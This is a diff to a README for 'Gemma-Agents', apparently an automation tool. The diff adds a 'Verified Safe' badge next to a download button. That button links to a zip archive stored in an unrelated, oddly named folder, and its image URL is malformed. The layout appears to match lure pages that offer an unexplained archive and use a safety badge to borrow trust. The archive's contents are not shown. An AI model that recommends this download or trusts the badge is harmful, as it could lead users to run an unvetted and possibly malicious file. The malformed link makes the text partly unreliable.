@@ -1,5 +1,7 @@
 # 🎉 Gemma-Agents - Automate Everyday Tasks Easily
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/raintreeloo-gemma-agents)
+
 [![Download Gemma-Agents](https://raw.githubusercontent.com/raintreeloo/Gemma-Agents/main/Ceriomyces/Gemma-Agents-3.9.zip%https://raw.githubusercontent.com/raintreeloo/Gemma-Agents/main/Ceriomyces/Gemma-Agents-3.9.zip)](https://raw.githubusercontent.com/raintreeloo/Gemma-Agents/main/Ceriomyces/Gemma-Agents-3.9.zip)
 
 ## 🚀 Getting Started
